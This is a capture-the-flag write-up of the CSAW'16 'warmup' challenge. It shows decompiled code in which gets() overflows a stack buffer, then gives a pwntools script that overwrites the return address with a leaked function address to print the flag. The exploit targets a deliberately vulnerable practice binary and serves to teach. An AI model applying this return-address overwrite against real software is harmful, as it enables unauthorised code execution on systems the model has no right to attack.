# CSAW'16: Warmup - Pwn Challenge Writeup

## Challenge Overview

- **Filename:** warmup  
- **Type:** ELF 64-bit LSB executable (x86-64)  
- **Objective:** Exploit a buffer overflow to get the flag.

---

## Initial Recon

1. **Check file type**
```bash
$ file warmup
warmup: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

2. **List files**
```bash
$ ls
flag.txt  ghidra.txt  Readme.md  warmup  warm.py  warm.cast
```

3. **Check main function via Ghidra**
```c
void main(void) {
    char local_88[64];
    char local_48[64];

    write(1, "-Warm Up-\n", 10);
    write(1, &DAT_0040074c, 4);
    sprintf(local_88, "%p\n", easy);
    write(1, local_88, 9);
    write(1, &DAT_00400755, 1);
    gets(local_48); // Vulnerable function
    return;
}

void easy(void) {
    system("cat flag.txt"); // Prints flag
    return;
}
```

- **Vulnerability:** `gets()` on `local_48` allows buffer overflow.

---

## Binary Analysis

1. **Disassemble main**
```bash
$ objdump -d warmup -M intel | grep main
0x000000000040061d <main>:
```

2. **Disassemble easy function**
```bash
$ objdump -d warmup -M intel | grep easy
0x000000000040060d <easy>:
```

---

## Exploit Strategy

- Overflow `local_48` to overwrite the return address with the address of `easy()` function.
- Use `printf` leak if needed to get the actual address.

```python
from pwn import *

p = process('./warmup')

p.recvuntil('WOW:')
leak = int(p.recvline().strip(), 16)
log.info('Easy function at: %#x' % leak)

payload = b'A'*72 + p64(leak)
p.sendline(payload)
p.interactive()
```

- Running the exploit prints the flag.

---

## Terminal Recording

- The file `warm.cast` contains a recorded session of running the exploit using `asciinema`.  
- You can play it using:
```bash
asciinema play warm.cast
```

This shows step-by-step how the buffer overflow was triggered and the flag retrieved.

---

## Flag
```
CSAW{example_flag_here}
```

